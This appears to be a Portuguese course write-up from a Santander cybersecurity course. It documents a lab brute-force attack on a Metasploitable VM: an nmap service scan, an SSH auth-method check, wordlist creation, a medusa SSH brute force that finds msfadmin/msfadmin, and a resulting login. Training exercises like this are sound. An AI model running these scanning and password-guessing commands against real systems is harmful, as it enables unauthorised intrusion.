# SIMULANDO UM ATAQUE DE BRUTE FORCE COM NMAP E MEDUSA
### Repositorio criado para compartilhar as evidencias do curso Santander - Cibersegurança 2025

1.	**Varredura de portas e versão do serviço**

`nmap -sV 192.168.200.20'<br/>`

nmap scan report for 192.168.200.20 (192.168.200.20) <br/>

Host is up (0.0017s latency <br/>
Not shown: 977 closed tcp ports (reset) <br/>

PORT     STATE SERVICE     VERSION <br/>
21/tcp   open  ftp         vsftpd 2.3.4 <br/>
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) <br/>
23/tcp   open  telnet      Linux telnetd <br/>
25/tcp   open  smtp        Postfix smtpd <br/>
53/tcp   open  domain      ISC BIND 9.4.2 <br/>
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2) <br/>
111/tcp  open  rpcbind     2 (RPC #100000) <br/>
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) <br/>
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) <br/>
512/tcp  open  exec        netkit-rsh rexecd <br/>
513/tcp  open  login       OpenBSD or Solaris rlogind <br/>
514/tcp  open  tcpwrapped <br/>
1099/tcp open  java-rmi    GNU Classpath grmiregistry <br/>
1524/tcp open  bindshell   Metasploitable root shell <br/>
2049/tcp open  nfs         2-4 (RPC #100003) <br/>
2121/tcp open  ftp         ProFTPD 1.3.1 <br/>
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5 <br/>
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7 <br/>
5900/tcp open  vnc         VNC (protocol 3.3) <br/>
6000/tcp open  X11         (access denied) <br/>
6667/tcp open  irc         UnrealIRCd <br/>
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3) <br/>
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1 <br/>
MAC Address: 00:0C:29:93:A7:D4 (VMware) <br/>
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel <br/>

2.	**Varredura na porta 22 com o script “ssh-auth-methods” para identificar os tipos de autenticação que o host permite**

'nmap -v -p22 --script=ssh-auth-methods -Pn 192.168.200.20' <br/>

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. <br/>
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-04 06:51 -03 <br/>
NSE: Loaded 1 scripts for scanning. <br/>
NSE: Script Pre-scanning. <br/>
Initiating NSE at 06:51 <br/>
Completed NSE at 06:51, 0.00s elapsed <br/>
Initiating ARP Ping Scan at 06:51 <br/>
Scanning 192.168.200.20 [1 port] <br/>
Completed ARP Ping Scan at 06:51, 0.07s elapsed (1 total hosts) <br/>
Initiating Parallel DNS resolution of 1 host. at 06:51 <br/>
Completed Parallel DNS resolution of 1 host. at 06:51, 0.00s elapsed <br/>
Initiating SYN Stealth Scan at 06:51 <br/>
Scanning 192.168.200.20 (192.168.200.20) [1 port] <br/>
Discovered open port 22/tcp on 192.168.200.20 <br/>
Completed SYN Stealth Scan at 06:51, 0.02s elapsed (1 total ports) <br/>
NSE: Script scanning 192.168.200.20. <br/>
Initiating NSE at 06:51 <br/>
Completed NSE at 06:51, 0.10s elapsed <br/>
Nmap scan report for 192.168.200.20 (192.168.200.20) <br/>
Host is up (0.00028s latency). <br/>

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|_    password
MAC Address: 00:0C:29:93:A7:D4 (VMware) <br/>

NSE: Script Post-scanning. <br/>
Initiating NSE at 06:51 <br/>
Completed NSE at 06:51, 0.00s elapsed <br/>
Read data files from: /usr/share/nmap <br/>
Nmap done: 1 IP address (1 host up) scanned in 0.41 seconds
           Raw packets sent: 2 (72B) | Rcvd: 2 (72B) <br/>

3.	**Criar listas de usuários e senhas**

echo -e "user\nmsfadmin\nroot\nservice\nadmin\nsysadmin" > users.txt <br/>
echo -e "123456\npassword\nqwerty\nmsfadmin\nadmin\npass123\npasswd" > pass.txt <br/>


4.	**Teste de usuário e senha no serviço ssh com wordlist**

'medusa -h 192.168.200.20 -U users.txt -P pass.txt -M ssh -t 6' <br/>

2025-11-04 07:22:48 ACCOUNT FOUND: [ssh] Host: 192.168.200.20 User: msfadmin Password: msfadmin [SUCCESS] <br/>

5. **Teste de acesso SSH com putty**

login as: msfadmin <br/>
msfadmin@192.168.200.20's password: <br/>
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 <br/>

The programs included with the Ubuntu system are free software; <br/>
the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. <br/>

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law.

To access official Ubuntu documentation, please visit: <br/>
http://help.ubuntu.com/ <br/>
No mail. <br/>
Last login: Tue Nov  4 04:38:44 2025 <br/>
msfadmin@metasploitable:~$ <br/>


